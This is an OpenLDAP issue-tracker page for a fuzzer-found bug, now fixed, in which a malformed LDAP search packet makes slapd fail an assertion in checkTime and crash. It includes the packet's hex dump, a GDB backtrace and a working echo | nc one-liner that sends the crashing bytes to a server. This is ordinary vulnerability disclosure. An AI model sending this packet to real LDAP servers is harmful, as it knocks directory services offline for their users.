<!DOCTYPE html>
<html lang="en">
  <head>
    <title>9454 &ndash; A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)</title>

      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1">

<link href="data/assets/dda5e7023b55f51361d33bf45a69940a.css?1631311398" rel="stylesheet" type="text/css">



    
<script type="text/javascript" src="data/assets/a7c2f3a028f17a9aa60f56dc9d6e732d.js?1631312165"></script>

    <script type="text/javascript">
    <!--
        YAHOO.namespace('bugzilla');
        YAHOO.util.Event.addListener = function (el, sType, fn, obj, overrideContext) {
               if ( ("onpagehide" in window || YAHOO.env.ua.gecko) && sType === "unload") { sType = "pagehide"; };
               var capture = ((sType == "focusin" || sType == "focusout") && !YAHOO.env.ua.ie) ? true : false;
               return this._addListener(el, this._getType(sType), fn, obj, overrideContext, capture);
         };
        if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
            YAHOO.util.Event._simpleRemove(window, "unload", 
                                           YAHOO.util.Event._unload);
        }
        
        function unhide_language_selector() { 
            YAHOO.util.Dom.removeClass(
                'lang_links_container', 'bz_default_hidden'
            ); 
        } 
        YAHOO.util.Event.onDOMReady(unhide_language_selector);

        
        var BUGZILLA = {
            param: {
                cookiepath: '\/',
                maxusermatches: 1000
            },
            constant: {
                COMMENT_COLS: 80
            },
            string: {
                

                attach_desc_required:
                    "You must enter a Description for this attachment.",
                component_required:
                    "You must select a Component for this issue.",
                description_required:
                    "You must enter a Description for this issue.",
                short_desc_required:
                    "You must enter a Summary for this issue.",
                version_required:
                    "You must select a Version for this issue."
            }
              , api_token: ''
        };

    if (history && history.replaceState) {
      if(!document.location.href.match(/show_bug\.cgi/)) {
        history.replaceState( null,
                             "9454 – A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)",
                             "show_bug.cgi?id=9454" );
        document.title = "9454 – A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)";
      }
      if (document.location.href.match(/show_bug\.cgi\?.*list_id=/)) {
        var href = document.location.href;
        href = href.replace(/[\?&]+list_id=(\d+|cookie)/, '');
        history.replaceState(null, "9454 – A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)", href);
      }
    }
    YAHOO.util.Event.onDOMReady(function() {
      initDirtyFieldTracking();

    });
    // -->
    </script>
<script type="text/javascript" src="data/assets/daf5e0fb6826e6a35280e622913f0c4a.js?1631312165"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Issue Tracking System" href="./search_plugin.cgi">
    <link rel="shortcut icon" href="images/favicon.ico">
  </head>

  <body 
        class="bugs-openldap-org
                 bz_bug
                 bz_status_VERIFIED
                 bz_product_OpenLDAP
                 bz_component_slapd
                 bz_bug_9454 yui-skin-sam">

  <div id="header"><div id="banner">
  </div>

    <div id="titles">
      <span id="title">OpenLDAP Issue Tracking System &ndash; Issue&nbsp;9454</span>

        <span id="subtitle" class="subheader">A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)</span>

        <span id="information" class="header_addl_info">Last modified: 2021-09-11 10:11:11 UTC</span>
    </div>


    <div id="common_links"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_top" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_top");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_top" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_top"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li></li>


  <li>
        <span class="separator">| </span>
        <a href="https://bugzilla.readthedocs.org/en/5.0/using/understanding.html" target="_blank">Help</a>
      </li>
    
      <li id="new_account_container_top">
        <span class="separator">| </span>
        <a href="createaccount.cgi">New&nbsp;Account</a>
      </li>

    <li id="mini_login_container_top">
  <span class="separator">| </span>
  <a id="login_link_top" href="show_bug.cgi?id=9454&amp;GoAheadAndLogIn=1"
     onclick="return show_mini_login_form('_top')">Log In</a>

  <form action="show_bug.cgi?id=9454" method="POST"
        class="mini_login bz_default_hidden"
        id="mini_login_top">
    <input id="Bugzilla_login_top" required
           name="Bugzilla_login" class="bz_login"
        type="email" placeholder="Email Address">
    <input class="bz_password" name="Bugzilla_password" type="password"
           id="Bugzilla_password_top" required
           placeholder="Password">
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
            id="log_in_top">
    <a href="#" onclick="return hide_mini_login_form('_top')">[x]</a>
  </form>
</li>
<li>
  <span id="github_mini_login_top" class="bz_default_hidden mini_login_top">
  </span>
    <form method="post" action="https://bugs.openldap.org/github.cgi">
      <input type="hidden" name="github_secret" value="I1pWDxm8g2yNHe6Q">
      <input type="hidden" name="target_uri" value="https://bugs.openldap.org/show_bug.cgi?id=9454">
      <input type="image" src="extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
</li>

  <li id="forgot_container_top">
    <span class="separator">| </span>
    <a id="forgot_link_top" href="show_bug.cgi?id=9454&amp;GoAheadAndLogIn=1#forgot"
       onclick="return show_forgot_form('_top')">Forgot Password</a>
    <form action="token.cgi" method="post" id="forgot_form_top"
          class="mini_forgot bz_default_hidden">
      <label for="login_top">Login:</label>
      <input name="loginname" size="20" id="login_top" required
          type="email" placeholder="Your Email Address">
      <input id="forgot_button_top" value="Reset Password" type="submit">
      <input type="hidden" name="a" value="reqpw">
      <input type="hidden" id="token_top" name="token"
             value="1635620611-d3Zo0X_WKJuyF9Vx0Iw4uS1rsgAEU1dmtY53w15hH3Q">
      <a href="#" onclick="return hide_forgot_form('_top')">[x]</a>
    </form>
  </li>
</ul>
    </div>
  </div>

  <div id="bugzilla-body">


<script type="text/javascript">
<!--

//-->
</script>

<form name="changeform" id="changeform" method="post" action="process_bug.cgi">

  <input type="hidden" name="delta_ts" value="2021-09-11 10:11:11">
  <input type="hidden" name="id" value="9454">
  <input type="hidden" name="token" value="1635620611-c7aZJ8vfYEpJCEhHNZlk3HkNVAIQJKvnkg_x0dN6Pn8">
<div class="bz_short_desc_container edit_form">
     <a href="show_bug.cgi?id=9454"><b>Issue&nbsp;9454</b></a> <span id="summary_container" class="bz_default_hidden">
      - <span id="short_desc_nonedit_display">A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)</span>
     </span>

    <div id="summary_input"><span class="field_label "
    id="field_label_short_desc">


  <a 
      title="The issue summary is a short sentence which succinctly describes what the issue is about."
      class="field_help_link"
      href="page.cgi?id=fields.html#short_desc"
  >Summary:</a>

</span><span title="A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)">A malicious packet can force OpenLDAP to fail an assertion and crash (schema_...
        </span>
    </div>
  </div>
  <script type="text/javascript">
    hideEditableField('summary_container',
                      'summary_input',
                      'summary_edit_action',
                      'short_desc',
                      'A malicious packet can force OpenLDAP to fail an assertion and crash (schema_init.c:3808: checkTime)' );
  </script>
  <table class="edit_form">
    <tr>
      
      <td id="bz_show_bug_column_1" class="bz_show_bug_column">     
        <table>
          <tr>
    <th class="field_label">
      <a href="page.cgi?id=fields.html#bug_status">Status</a>:
    </th>
    <td id="bz_field_status">
      <span id="static_bug_status">VERIFIED
          FIXED
      </span>
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_alias">


  <a 
      title="A short, unique name assigned to an issue in order to assist with looking it up and referring to it in other places in Bugzilla."
      class="field_help_link"
      href="page.cgi?id=fields.html#alias"
  >Alias:</a>

</th>
    <td>
        None
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_product">


  <a 
      title="Issues are categorised into Products and Components."
      class="field_help_link"
      href="describecomponents.cgi"
  >Product:</a>

</th>
  <td class="field_value "
      id="field_container_product" >OpenLDAP

</td>
      </tr>

    
    <tr class="bz_default_hidden"><th class="field_label "
    id="field_label_classification">


  <a 
      title="Issues are categorised into Classifications, Products and Components. classifications is the top-level categorisation."
      class="field_help_link"
      href="page.cgi?id=fields.html#classification"
  >Classification:</a>

</th>
  <td class="field_value "
      id="field_container_classification" >Unclassified

</td>
    </tr>
        
    
    
      <tr><th class="field_label "
    id="field_label_component">


  <a 
      title="Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list."
      class="field_help_link"
      href="describecomponents.cgi?product=OpenLDAP"
  >Component:</a>

</th>
  <td class="field_value "
      id="field_container_component" >slapd

  (<a href="buglist.cgi?component=slapd&amp;product=OpenLDAP&amp;bug_status=__open__"
      target="_blank">show other issues</a>)
</td>
      </tr>
    <tr><th class="field_label "
    id="field_label_version">


  <a 
      title="The version field defines the version of the software the issue was found in."
      class="field_help_link"
      href="page.cgi?id=fields.html#version"
  >Version:</a>

</th>
<td>unspecified
  </td>
    </tr>
        
    
        
    <tr><th class="field_label "
    id="field_label_rep_platform">


  <a 
      title="The hardware platform the issue was observed on. Note: When searching, selecting the option &quot;All&quot; only finds issues whose value for this field is literally the word &quot;All&quot;."
      class="field_help_link"
      href="page.cgi?id=fields.html#rep_platform"
  >Hardware:</a>

</th>
      <td class="field_value">All
        All
      </td>
    </tr>
          <tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
          
          <tr>
      <th class="field_label">
        <label  accesskey="i">
          <a href="page.cgi?id=fields.html#importance"><u>I</u>mportance</a></label>:
      </th>
      <td>---

       normal
      </td>
    </tr>

      <tr><th class="field_label "
    id="field_label_target_milestone">


  <a 
      title="The Target Milestone field is used to define when the engineer the issue is assigned to expects to fix it."
      class="field_help_link"
      href="page.cgi?id=fields.html#target_milestone"
  >Target Milestone:</a>

</th><td>2.5.1
  </td>
      </tr>
          
          <tr><th class="field_label "
    id="field_label_assigned_to">


  <a 
      title="The person in charge of resolving the issue."
      class="field_help_link"
      href="page.cgi?id=fields.html#assigned_to"
  >Assignee:</a>

</th>
      <td><span class="vcard"><span class="fn">OpenLDAP project</span>
</span>
      </td>
    </tr>

    <script type="text/javascript">
      assignToDefaultOnChange(['product', 'component'],
        'bugs\x40openldap.org',
        '');
    </script>
          <tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
          <tr><th class="field_label "
    id="field_label_bug_file_loc">


  <a 
      title="Issues can have a URL associated with them - for example, a pointer to a web site where the problem is seen."
      class="field_help_link"
      href="page.cgi?id=fields.html#bug_file_loc"
  >URL:</a>

</th>
    <td>
      <span id="bz_url_input_area">
      </span>
    </td>
  </tr>


      <tr><th class="field_label "
    id="field_label_keywords">


  <a 
      title="You can add keywords from a defined list to issues, in order to easily identify and group them."
      class="field_help_link"
      href="describekeywords.cgi"
  >Keywords:</a>

</th>
  <td class="field_value "
      id="field_container_keywords" >

</td>
      </tr>
          <tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>

          
<tr><th class="field_label "
    id="field_label_dependson">


  <a 
      title="The issues listed here must be resolved before this issue can be resolved."
      class="field_help_link"
      href="page.cgi?id=fields.html#dependson"
  >Depends on:</a>

</th>

  <td>
    <span id="dependson_input_area">
    </span>

  </td>
  </tr>
  
  <tr><th class="field_label "
    id="field_label_blocked">


  <a 
      title="This issue must be resolved before the issues listed in this field can be resolved."
      class="field_help_link"
      href="page.cgi?id=fields.html#blocked"
  >Blocks:</a>

</th>

  <td>
    <span id="blocked_input_area">
    </span>

  </td>
  </tr>
          
        </table>
      </td>
      <td>
        <div class="bz_column_spacer">&nbsp;</div>
      </td>
      
      <td id="bz_show_bug_column_2" class="bz_show_bug_column">
        <table>
        <tr>
    <th class="field_label">
      Reported:
    </th>
    <td>2021-02-06 09:06 UTC by <span class="vcard">phasip
</span>
    </td>
  </tr>
  
  <tr>
    <th class="field_label">
      Modified:
    </th>
    <td>2021-09-11 10:11 UTC
      (<a href="show_activity.cgi?id=9454">History</a>)
    </td>
  
  </tr>
<tr>
      <th class="field_label">
        <label  accesskey="a">
          CC List:
        </label>
      </th>
      <td>0 
          users
        <div id="cc_edit_area">
          <br>
        </div>
      </td>
    </tr>

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_see_also">


  <a 
      title="This allows you to refer to issues in other installations. You can enter a URL to an issue in the 'Add Issue URLs' field to note that that issue is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to issues in other installations. For issues in this installation, it is better to use the Depends on and Blocks fields."
      class="field_help_link"
      href="page.cgi?id=fields.html#see_also"
  >See Also:</a>

</th>
  <td class="field_value "
      id="field_container_see_also" >

</td>
    </tr> 

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>



        </table>
      </td>
    </tr>
    <tr>
      <td colspan="3">
          <hr id="bz_top_half_spacer">
      </td>
    </tr>
  </table>

  <table id="bz_big_form_parts">
  <tr>
  <td>

    
<script type="text/javascript">
<!--
function toggle_display(link) {
    var table = document.getElementById("attachment_table");
    var view_all = document.getElementById("view_all");
    var hide_obsolete_url_parameter = "&hide_obsolete=1";
    // Store current height for scrolling later
    var originalHeight = table.offsetHeight;
    var rows = YAHOO.util.Dom.getElementsByClassName(
        'bz_tr_obsolete', 'tr', table);

    for (var i = 0; i < rows.length; i++) {
        bz_toggleClass(rows[i], 'bz_default_hidden');
    }

    if (YAHOO.util.Dom.hasClass(rows[0], 'bz_default_hidden')) {
        link.innerHTML = "Show Obsolete";
        view_all.href = view_all.href + hide_obsolete_url_parameter 
    }
    else {
        link.innerHTML = "Hide Obsolete";
        view_all.href = view_all.href.replace(hide_obsolete_url_parameter,"");
    }

    var newHeight = table.offsetHeight;
    // This scrolling makes the window appear to not move at all.
    window.scrollBy(0, newHeight - originalHeight);

    return false;
}
//-->
</script>

<br>
<table id="attachment_table">
  <tr id="a0">
    <th colspan="2" class="left">
      Attachments
    </th>
  </tr>



  <tr class="bz_attach_footer">
    <td colspan="2">
        <a href="attachment.cgi?bugid=9454&amp;action=enter">Add an attachment</a>
        (proposed patch, testcase, etc.)
    </td>
  </tr>
</table>
<br>
<div id="add_comment" class="bz_section_additional_comments">
      <table>
        <tr>
          <td>
            <fieldset>
              <legend>Note</legend>
              You need to
              <a href="show_bug.cgi?id=9454&amp;GoAheadAndLogIn=1">log in</a>
              before you can comment on or make changes to this issue.
            </fieldset>
          </td>
        </tr> 
      </table>
  </div>
  </td>
  <td>
  </td>
  </tr></table>

  
  <div id="comments"><script src="js/comments.js?1584027537" type="text/javascript">
</script>

<script type="text/javascript">
<!--
  /* Adds the reply text to the 'comment' textarea */
  function replyToComment(id, real_id, name) {
      var prefix = "(In reply to " + name + " from comment #" + id + ")\n";
      var replytext = "";
        /* pre id="comment_name_N" */
        var text_elem = document.getElementById('comment_text_'+id);
        var text = getText(text_elem);
        replytext = prefix + wrapReplyText(text);


      /* <textarea id="comment"> */
      var textarea = document.getElementById('comment');
      if (textarea.value != replytext) {
          textarea.value += replytext;
      }

      textarea.focus();
  } 
//-->
</script>


<!-- This auto-sizes the comments and positions the collapse/expand links 
     to the right. -->
<table class="bz_comment_table">
<tr>
<td>
<div id="c0" class="bz_comment bz_first_comment">

      <div class="bz_first_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=9454#c0">Description</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard">phasip
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2021-02-06 09:06:05 UTC
        </span>

      </div>




<pre class="bz_comment_text">A malicious packet can force OpenLDAP to fail an assertion and crash
slapd: schema_init.c:3808: checkTime: Assertion `!BER_BVISEMPTY( in )' failed.

Packet:
    00000000: 3082 016a 0201 3063 30df df30 0030 0030  0..j..0c0..0.0.0
    00000010: 0030 0030 0030 00a0 8201 3030 0030 0930  .0.0.0....00.0.0
    00000020: 3030 3030 3030 3030 302e 3030 3030 3030  000000000.000000
    00000030: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000040: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000050: 3030 3030 3030 3030 a930 8109 322e 352e  00000000.0..2.5.
    00000060: 3133 2e33 3883 2e7b 2020 2020 7468 6973  13.38..{    this
    00000070: 5570 6461 7465 2020 2020 2022 2220 2c69  Update     &quot;&quot; ,i
    00000080: 7373 7545 7220 7264 6e53 6571 7565 6e63  ssuEr rdnSequenc
    00000090: 653a 2222 7d30 3030 3030 3030 3030 3030  e:&quot;&quot;}00000000000
    000000a0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    000000b0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    000000c0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    000000d0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    000000e0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    000000f0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000100: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000110: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000120: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000130: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000140: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000150: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
    00000160: 3030 3030 3030 3030 3030 3030 3030       00000000000000


GDB output:
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
    601e59e1 &#64;(#) $OpenLDAP: slapd 2.X (Feb  6 2021 08:48:29) $
        &#64;3790967905a3:/openldap/servers/slapd
    601e59e1 slapd starting
    [New Thread 0x7fff8b2d3700 (LWP 13)]
    [New Thread 0x7fff8aad2700 (LWP 14)]
    601e59e6 conn=1000 fd=11 ACCEPT from IP=127.0.0.1:42330 (IP=0.0.0.0:1389)
    [New Thread 0x7fff8a2d1700 (LWP 15)]
    601e59e6 get_filter: unknown filter type=48
    601e59e6 get_filter: unknown filter type=48
    601e59e6 get_filter: unknown filter type=48
    slapd: schema_init.c:3808: checkTime: Assertion `!BER_BVISEMPTY( in )' failed.

    Thread 3 &quot;slapd&quot; received signal SIGABRT, Aborted.
    [Switching to Thread 0x7fff8aad2700 (LWP 14)]
    __GI_raise (sig=sig&#64;entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
    50	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
    (gdb) bt
    #0  __GI_raise (sig=sig&#64;entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
    #1  0x00007ffff7dd4859 in __GI_abort () at abort.c:79
    #2  0x00007ffff7dd4729 in __assert_fail_base (
        fmt=0x7ffff7f6a588 &quot;%s%s%s:%u: %s%sAssertion `%s' failed.\n%n&quot;, 
        assertion=0x55555568d363 &quot;!BER_BVISEMPTY( in )&quot;, 
        file=0x55555568d2f3 &quot;schema_init.c&quot;, line=3808, function=&lt;optimized out&gt;)
        at assert.c:92
    #3  0x00007ffff7de5f36 in __GI___assert_fail (
        assertion=assertion&#64;entry=0x55555568d363 &quot;!BER_BVISEMPTY( in )&quot;, 
        file=file&#64;entry=0x55555568d2f3 &quot;schema_init.c&quot;, line=line&#64;entry=3808, 
        function=function&#64;entry=0x5555556908f0 &lt;__PRETTY_FUNCTION__.14047&gt; &quot;checkTime&quot;) at assert.c:101
    #4  0x00005555555bac61 in checkTime (in=in&#64;entry=0x7fff8aad06f0, 
        out=out&#64;entry=0x0) at schema_init.c:3808
    #5  0x00005555555bcd1a in issuerAndThisUpdatePretty (syntax=0x555555784150, 
        in=0x7fff8aad0800, out=0x7fff8aad0770, ctx=0x7fff7c001630)
        at schema_init.c:4095
    #6  0x000055555559df4d in asserted_value_validate_normalize (ad=0x0, 
        mr=0x555555789e50, usage=usage&#64;entry=2049, in=in&#64;entry=0x7fff8aad0800, 
        out=out&#64;entry=0x7fff8aad0828, text=text&#64;entry=0x7fff8aad1aa0, 
        ctx=0x7fff7c001630) at value.c:153
    #7  0x00005555555d3a94 in get_mra (op=op&#64;entry=0x7fff7c0010f0, 
        ber=ber&#64;entry=0x7fff7c000f10, f=f&#64;entry=0x7fff8aad08c0, 
    --Type &lt;RET&gt; for more, q to quit, c to continue without paging--
        text=text&#64;entry=0x7fff8aad1aa0) at mra.c:198
    #8  0x0000555555587543 in get_filter0 (op=op&#64;entry=0x7fff7c0010f0, 
        ber=ber&#64;entry=0x7fff7c000f10, filt=filt&#64;entry=0x7fff7c0016e8, 
        text=text&#64;entry=0x7fff8aad1aa0, depth=depth&#64;entry=1) at filter.c:290
    #9  0x0000555555587793 in get_filter_list (op=op&#64;entry=0x7fff7c0010f0, 
        ber=ber&#64;entry=0x7fff7c000f10, f=f&#64;entry=0x7fff8aad0988, 
        text=text&#64;entry=0x7fff8aad1aa0, depth=depth&#64;entry=1) at filter.c:354
    #10 0x000055555558731e in get_filter0 (op=op&#64;entry=0x7fff7c0010f0, 
        ber=0x7fff7c000f10, filt=filt&#64;entry=0x7fff7c001170, 
        text=text&#64;entry=0x7fff8aad1aa0, depth=depth&#64;entry=0) at filter.c:235
    #11 0x00005555555880b6 in get_filter (op=op&#64;entry=0x7fff7c0010f0, 
        ber=&lt;optimized out&gt;, filt=filt&#64;entry=0x7fff7c001170, 
        text=text&#64;entry=0x7fff8aad1aa0) at filter.c:332
    #12 0x0000555555585396 in do_search (op=0x7fff7c0010f0, rs=0x7fff8aad1a80)
        at search.c:127
    #13 0x0000555555583d09 in connection_operation (ctx=ctx&#64;entry=0x7fff8aad1ba0, 
        arg_v=0x7fff7c0010f0) at connection.c:1163
    #14 0x0000555555584370 in connection_read_thread (ctx=0x7fff8aad1ba0, argv=0xb)
        at connection.c:1314
    #15 0x00005555556711e4 in ldap_int_thread_pool_wrapper (xpool=0x555555799240)
        at tpool.c:1051
    #16 0x00007ffff7faa609 in start_thread (arg=&lt;optimized out&gt;)
        at pthread_create.c:477
    --Type &lt;RET&gt; for more, q to quit, c to continue without paging--
    #17 0x00007ffff7ed1293 in clone ()
        at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95


Testing:
    1. Launch openldap
    (Current public repo)
    docker run -it --net=host bitnami/openldap
    (More recent develop)
    docker run -it --net=host phasip/openldap
    2. Send crashing packet
    echo -en '\x30\x82\x01\x6a\x02\x01\x30\x63\x30\xdf\xdf\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\xa0\x82\x01\x30\x30\x00\x30\x09\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x2e\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\xa9\x30\x81\x09\x32\x2e\x35\x2e\x31\x33\x2e\x33\x38\x83\x2e\x7b\x20\x20\x20\x20\x74\x68\x69\x73\x55\x70\x64\x61\x74\x65\x20\x20\x20\x20\x20\x22\x22\x20\x2c\x69\x73\x73\x75\x45\x72\x20\x72\x64\x6e\x53\x65\x71\x75\x65\x6e\x63\x65\x3a\x22\x22\x7d\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30' | nc localhost 1389

-- Note --
I had forgotten the fuzzer was running. As only one crash has been found in a while the fuzzing machine will retire now. I will collect the corpus into <a href="https://github.com/Phasip/openldap_fuzz">https://github.com/Phasip/openldap_fuzz</a></pre>
    </div>

    <div id="c1" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=9454#c1">Comment 1</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Howard Chu</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2021-02-06 20:52:50 UTC
        </span>

      </div>




<pre class="bz_comment_text">fixed in master</pre>
    </div>

    <div id="c2" class="bz_comment">

      <div class="bz_comment_head">


        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=9454#c2">Comment 2</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Quanah Gibson-Mount</span>
</span>
        </span>

        <span class="bz_comment_user_images">
        </span>

        <span class="bz_comment_time">
          2021-02-06 22:21:10 UTC
        </span>

      </div>




<pre class="bz_comment_text">trunk:

  • 3539fc33 
by Howard Chu at 2021-02-06T20:52:06+00:00 
ITS#9454 fix issuerAndThisUpdateCheck


RE25:

  • e2acb7c7 
by Howard Chu at 2021-02-06T22:09:40+00:00 
ITS#9454 fix issuerAndThisUpdateCheck

RE24:

 • 9badb734 
by Howard Chu at 2021-02-06T22:19:57+00:00 
ITS#9454 fix issuerAndThisUpdateCheck</pre>
    </div>


  

</td>
<td>
</td>
</tr></table>
  </div>
        

</form>

<hr>
<ul class="related_actions">
    <li><a href="show_bug.cgi?format=multiple&amp;id=9454">Format For Printing</a></li>
    <li>&nbsp;-&nbsp;<a href="show_bug.cgi?ctype=xml&amp;id=9454">XML</a></li>
    <li>&nbsp;-&nbsp;<a href="enter_bug.cgi?cloned_bug_id=9454">Clone This Issue</a></li>
    
    <li>&nbsp;-&nbsp;<a href="#">Top of page </a></li>
    </ul>

<br>
</div>

    <div id="footer">
      <div class="intro"></div>
<ul id="useful-links">
  <li id="links-actions"><ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_bottom" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_bottom");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_bottom" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_bottom"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li></li>


  <li>
        <span class="separator">| </span>
        <a href="https://bugzilla.readthedocs.org/en/5.0/using/understanding.html" target="_blank">Help</a>
      </li>
    
      <li id="new_account_container_bottom">
        <span class="separator">| </span>
        <a href="createaccount.cgi">New&nbsp;Account</a>
      </li>

    <li id="mini_login_container_bottom">
  <span class="separator">| </span>
  <a id="login_link_bottom" href="show_bug.cgi?id=9454&amp;GoAheadAndLogIn=1"
     onclick="return show_mini_login_form('_bottom')">Log In</a>

  <form action="show_bug.cgi?id=9454" method="POST"
        class="mini_login bz_default_hidden"
        id="mini_login_bottom">
    <input id="Bugzilla_login_bottom" required
           name="Bugzilla_login" class="bz_login"
        type="email" placeholder="Email Address">
    <input class="bz_password" name="Bugzilla_password" type="password"
           id="Bugzilla_password_bottom" required
           placeholder="Password">
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
            id="log_in_bottom">
    <a href="#" onclick="return hide_mini_login_form('_bottom')">[x]</a>
  </form>
</li>
<li>
  <span id="github_mini_login_bottom" class="bz_default_hidden mini_login_bottom">
  </span>
    <form method="post" action="https://bugs.openldap.org/github.cgi">
      <input type="hidden" name="github_secret" value="I1pWDxm8g2yNHe6Q">
      <input type="hidden" name="target_uri" value="https://bugs.openldap.org/show_bug.cgi?id=9454">
